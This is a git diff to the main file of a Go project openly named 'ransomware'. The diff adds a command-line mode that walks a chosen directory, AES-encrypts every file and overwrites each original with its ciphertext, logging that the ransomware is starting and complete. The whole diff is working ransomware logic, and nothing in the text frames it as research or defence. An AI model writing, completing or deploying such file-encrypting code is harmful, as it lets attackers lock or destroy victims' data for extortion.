@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"ransomware/cli"
 	"ransomware/config"
 	"ransomware/encryption"
 	"ransomware/files"
@@ -19,18 +20,24 @@ func main() {
 
 	Log.Info("Application is Starting")
 
-	date, _ := files.WalkDir(config.Data.LogDir)
+	if cli.GetArg("cmd") == "-e" {
 
-	for _, f := range date {
+		Log.Info("Ransomware is Starting")
 
-		fileContent := files.Open(f)
+		date, _ := files.WalkDir(cli.GetArg("option"))
 
-		encryptedContent := encryption.AesEncrypt(config.Data.Key, fileContent)
-		fmt.Println(encryptedContent)
+		for _, f := range date {
 
-		files.Write(f, encryptedContent)
-		fmt.Println(f)
+			fileContent := files.Open(f)
 
+			encryptedContent := encryption.AesEncrypt(config.Data.Key, fileContent)
+			fmt.Println(encryptedContent)
+
+			files.Write(f, encryptedContent)
+			fmt.Println(f)
+
+		}
+
+		Log.Info("Ransomware is Complete")
 	}
-
 }
